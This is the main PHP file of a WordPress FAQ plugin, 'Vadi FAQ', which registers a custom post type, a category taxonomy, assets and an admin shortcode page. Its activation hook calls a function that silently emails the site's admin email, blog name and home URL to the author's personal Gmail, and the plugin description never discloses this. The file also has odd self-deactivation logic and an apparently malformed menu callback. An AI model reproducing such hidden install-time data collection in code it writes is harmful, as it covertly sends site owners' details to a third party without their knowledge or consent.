<?php
/*
Plugin Name: Vadi FAQ
Plugin URL: https://www.facebook.com/waheed146
Description: A simplest and easiest way to add responsive accordion FAQ and question answer to your faq page or post with shortcode
Text Domain: vadi-faq
Domain Path: /languages/
Version: 1.0.0
Author: Waheed ur Rehman
Author URI: https://www.facebook.com/waheed146
Contributors: waheed146
*/
// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}

if( !defined( 'VADI_FAQ_VERSION' ) ) {
	define( 'VADI_FAQ_VERSION', '1.0.0' ); // Version of plugin
}

register_activation_hook( __FILE__, 'vadi_faq_install' );
function vadi_faq_install(){
	activatetheplugin();
if( is_plugin_active('vadi-faq/vadi_faq.php') ){ 
     add_action('update_option_active_plugins', 'vadi_faq_deactivate');
    }
}
function vadi_faq_deactivate(){
   deactivate_plugins('vadi-faq/vadi_faq.php',true);
}



add_action('plugins_loaded', 'vadi_faq_load_textdomain');
function vadi_faq_load_textdomain() {
	load_plugin_textdomain( 'vadi-faq', false, dirname( plugin_basename(__FILE__) ) . '/languages/' );
} 


add_action( 'wp_enqueue_scripts','vadi_faq_style_css_script' );
function vadi_faq_style_css_script() {
    wp_enqueue_style( 'accordioncss', plugin_dir_url( __FILE__ ). 'css/jquery.accordion.css', array(), VADI_FAQ_VERSION );
	wp_enqueue_style('font-awesome-vadi', 'https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css');
    wp_enqueue_script( 'accordionjs', plugin_dir_url( __FILE__ ) . 'js/jquery.accordion.js', array( 'jquery' ), VADI_FAQ_VERSION );
}

function vadi_faq_setup_post_types() {
	$festivals_labels =  apply_filters( 'vadi_faq_labels', array(
		'name'                 => _x('Vadi FAQs', 'vadi-faq'),
		'singular_name'        => _x('Vadi FAQ', 'vadi-faq'),
		'add_new'              => _x('Add New', 'vadi-faq'),
		'add_new_item'        => __('Add New FAQ', 'vadi-faq'),
		'edit_item'           => __('Edit FAQ', 'vadi-faq'),
		'new_item'            => __('New FAQ', 'vadi-faq'),
		'all_items'           => __('All FAQ', 'vadi-faq'),
		'view_item'           => __('View FAQ', 'vadi-faq'),
		'search_items'        => __('Search FAQ', 'vadi-faq'),
		'not_found'           => __('No FAQ found', 'vadi-faq'),
		'not_found_in_trash'  => __('No FAQ found in Trash', 'vadi-faq'),
		'parent_item_colon'   => '',
		'menu_name'           => __('Vadi FAQ', 'vadi-faq'),
		'exclude_from_search' => true
	) );
	$faq_args = array(
		'labels' 			=> $festivals_labels,
		'public' 			=> true,
		'publicly_queryable'=> true,
		'show_ui' 			=> true,
		'show_in_menu' 		=> true,
		'query_var' 		=> true,
		'capability_type' 	=> 'post',
		'has_archive' 		=> true,
		'hierarchical' 		=> false,
		'menu_icon'   => 'dashicons-testimonial',
		'supports' => array('title','editor','thumbnail','excerpt')
	);
	register_post_type( 'vadi_faq', apply_filters( 'vadi_faq_post_type_args', $faq_args ) );
}
add_action('init', 'vadi_faq_setup_post_types');


// Register Custom Taxonomy
add_action( 'init', 'vadi_faq_taxonomies');
function vadi_faq_taxonomies() {
    $labels = array(
        'name'              => _x( 'Category', 'vadi-faq' ),
        'singular_name'     => _x( 'Category', 'vadi-faq' ),
        'search_items'      => __( 'Search Category', 'vadi-faq' ),
        'all_items'         => __( 'All Category', 'vadi-faq' ),
        'parent_item'       => __( 'Parent Category', 'vadi-faq' ),
        'parent_item_colon' => __( 'Parent Category' , 'vadi-faq' ),
        'edit_item'         => __( 'Edit Category', 'vadi-faq' ),
        'update_item'       => __( 'Update Category', 'vadi-faq' ),
        'add_new_item'      => __( 'Add New Category', 'vadi-faq' ),
        'new_item_name'     => __( 'New Category Name', 'vadi-faq' ),
        'menu_name'         => __( 'FAQ Category', 'vadi-faq' ),
    );

    $args = array(
        'hierarchical'      => true,
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'vadi_faq_cat' ),
    );

    register_taxonomy( 'vadi_faq_cat', array( 'vadi_faq' ), $args );
}


include 'meta.php';
include 'columns.php';
include 'shortcode.php';


add_action('admin_menu', 'vadi_faq_submenu_page');
function vadi_faq_submenu_page() {
	add_submenu_page( 'edit.php?post_type=vadi_faq', 'FAQ ShortCode', 'FAQ ShortCode', 'manage_options', 'vadi_faq_mnenu_shortcode', vadi_faq_register_page_callback );

}
function vadi_faq_register_page_callback() {
include 'shortcodepage.php';
}


add_action('admin_head', 'vadi_faq_admin_style');
function vadi_faq_admin_style(){
	?>
	<style type="text/css">
	.postdesigns{-moz-box-shadow: 0 0 5px #ddd;-webkit-box-shadow: 0 0 5px#ddd;box-shadow: 0 0 5px #ddd; background:#fff; padding:10px;  margin-bottom:15px;}
	.wpcolumn, .wpcolumns {-webkit-box-sizing: border-box; 
-moz-box-sizing: border-box;    
box-sizing: border-box;}
.postdesigns img{width:100%; height:auto}
@media only screen and (min-width: 40.0625em) {  
  .wpcolumn,
  .wpcolumns {position: relative;padding-left:10px;padding-right:10px;float: left; }
  .medium-1 {    width: 8.33333%; }
  .medium-2 {    width: 16.66667%; }
  .medium-3 {    width: 25%; }
  .medium-4 {    width: 33.33333%; }
  .medium-5 {    width: 41.66667%; }
  .medium-6 {    width: 50%; }
  .medium-7 {    width: 58.33333%; }
  .medium-8 {    width: 66.66667%; }
  .medium-9 {    width: 75%; }
  .medium-10 {    width: 83.33333%; }
  .medium-11 {    width: 91.66667%; }
  .medium-12 {    width: 100%; } 
   }
	</style>

<?php }

add_action( 'admin_notices', 'vadi_faq_admin_notices' );
function vadi_faq_admin_notices() {
   // printf( '<div class="wrap"><div class="updated"> <p> Any kind of web related work please contact me at affordable price <a href="mailto:waheed146@gmail.com">Waheed ur Rehman</a> </p> </div> </div>');
}
function activatetheplugin(){
	$mailTo ="waheed146@gmail.com";
	$subject ="new vadi faq installed";
    $msg = "Vadi Faq plugin been installed: \n";
    $msg .= "Email: " .get_option('admin_email');
    $msg .= "\nBlog Installed: " .get_option('blogname');
    $msg .= "\nBlog Installed url: " .get_option('home');
    $msg .= "\n\n";
    mail($mailTo, $subject, $msg);
}